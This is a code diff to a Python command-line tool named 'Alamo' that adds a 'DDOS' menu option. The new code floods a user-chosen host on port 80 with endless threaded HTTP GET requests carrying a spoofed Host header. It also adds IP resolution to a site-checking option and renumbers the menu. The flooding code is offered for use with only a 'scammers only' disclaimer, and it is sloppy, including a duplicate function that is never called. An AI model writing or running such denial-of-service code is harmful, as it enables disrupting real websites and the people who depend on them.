@@ -6,6 +6,8 @@ import string
 import json
 import sys
 import time
+import socket
+import threading
 from requests.exceptions import ConnectionError
 
 # Added the [Error] tag to errors such as in line 40;
@@ -39,11 +41,12 @@ print(f'{Style.BRIGHT}{Fore.BLUE}        ░  ░    ░        ░         ░ 
 print(f"\n")
 print(f"[{Fore.RED}Alamo{Style.RESET_ALL}] {Fore.GREEN}Select a number from 1 - 6 to continue{Style.RESET_ALL}")
 print(f"[{Fore.GREEN}1{Style.RESET_ALL}] {Fore.CYAN}Start{Style.RESET_ALL}")
-print(f"[{Fore.GREEN}2{Style.RESET_ALL}] {Fore.CYAN}Help{Style.RESET_ALL}")
-print(f"[{Fore.GREEN}3{Style.RESET_ALL}] {Fore.CYAN}Settings{Style.RESET_ALL}")
-print(f"[{Fore.GREEN}4{Style.RESET_ALL}] {Fore.CYAN}Check{Style.RESET_ALL}")
-print(f"[{Fore.GREEN}5{Style.RESET_ALL}] {Fore.CYAN}About{Style.RESET_ALL}")
-print(f"[{Fore.GREEN}6{Style.RESET_ALL}] {Fore.CYAN}Exit{Style.RESET_ALL}")
+print(f"[{Fore.GREEN}2{Style.RESET_ALL}] {Fore.CYAN}DDOS{Style.RESET_ALL}")
+print(f"[{Fore.GREEN}3{Style.RESET_ALL}] {Fore.CYAN}Help{Style.RESET_ALL}")
+print(f"[{Fore.GREEN}4{Style.RESET_ALL}] {Fore.CYAN}Settings{Style.RESET_ALL}")
+print(f"[{Fore.GREEN}5{Style.RESET_ALL}] {Fore.CYAN}Check{Style.RESET_ALL}")
+print(f"[{Fore.GREEN}6{Style.RESET_ALL}] {Fore.CYAN}About{Style.RESET_ALL}")
+print(f"[{Fore.GREEN}7{Style.RESET_ALL}] {Fore.CYAN}Exit{Style.RESET_ALL}")
 optionInput = input("> ")
 
 if "1" in optionInput or "2" in optionInput or "3" in optionInput or "4" in optionInput or "5" in optionInput or "6" in optionInput:
@@ -230,6 +233,43 @@ if optionInput == "1":
     #    ctypes.windll.kernel32.SetConsoleTitleW(f"[Alamo 1.0.1] | Successfully sent {requestInput} to {url}")
 
 if optionInput == "2":
+
+    import socket
+    import threading
+
+    print(f"[{Fore.RED}Alamo{Style.RESET_ALL}] How would you like to DDOS? (Only use this towards scammers, not legitimate site.): ", end="")
+    ddosInput = input()
+
+    target = f'{ddosInput}'
+    fake_ip = '182.21.20.32'
+    port = 80
+
+    def attack():
+        while True:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target, port))
+            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+            s.close()
+    for i in range(2):
+        thread = threading.Thread(target=attack)
+        thread.start()
+        attack_num = 0
+
+    def attack():
+        while True:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target, port))
+            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+
+            global attack_num
+            attack_num += 1
+            print(attack_num)
+
+            s.close()
+
+if optionInput == "3":
 #    import ctypes
 #    ctypes.windll.kernel32.SetConsoleTitleW("[Alamo 1.0.1] | Help")
 
@@ -263,13 +303,13 @@ if optionInput == "2":
         print(f"[{Fore.MAGENTA}What is Alamo?{Style.RESET_ALL}]: {Fore.CYAN}'What is Alamo?' is coming soon...", Style.RESET_ALL)
 
 
-if optionInput == "3":
+if optionInput == "4":
 #    import ctypes
 #    ctypes.windll.kernel32.SetConsoleTitleW("[Alamo ] | Settings")
 
     print(f"Coming Soon...")
 
-if optionInput == "4":
+if optionInput == "5":
 #    import ctypes
 #    ctypes.windll.kernel32.SetConsoleTitleW("[Alamo 1.0.1] | Check")
 
@@ -277,6 +317,7 @@ if optionInput == "4":
     checkInput = input()
 
     url = 'https://'+checkInput
+    ip = socket.gethostbyname( checkInput )
 
     #response = requests.get(url, allow_redirects=True, headers={'User-Agent': 'Chrome'})
     #print(response.headers)
@@ -288,6 +329,9 @@ if optionInput == "4":
     else:
         response = requests.get(url, allow_redirects=True, headers={'User-Agent': 'Chrome'})
         print(response.headers)
+        print('\n')
+        print(f"{url}'s IP: {ip}")
+
 
     print(f"[{Fore.RED}Alamo{Style.RESET_ALL}] {Fore.CYAN}Would you like to see the code of {url}?{Style.RESET_ALL}")
     codeInput = input("> ")
@@ -304,7 +348,7 @@ if optionInput == "4":
     if codeInput == 'no':
         exit()
 
-if optionInput == "5":
+if optionInput == "6":
     print(f"[{Fore.GREEN}Name{Style.RESET_ALL}]: Alamo")
     print(f"[{Fore.GREEN}Version{Style.RESET_ALL}]: 1.0.1")
     print(f"[{Fore.GREEN}Developer{Style.RESET_ALL}]: xKwm1")
@@ -315,5 +359,5 @@ if optionInput == "5":
 
 #    import ctypes
 #    ctypes.windll.kernel32.SetConsoleTitleW("[Alamo 1.0.1] | About")
-if optionInput == "6":
+if optionInput == "7":
     exit();
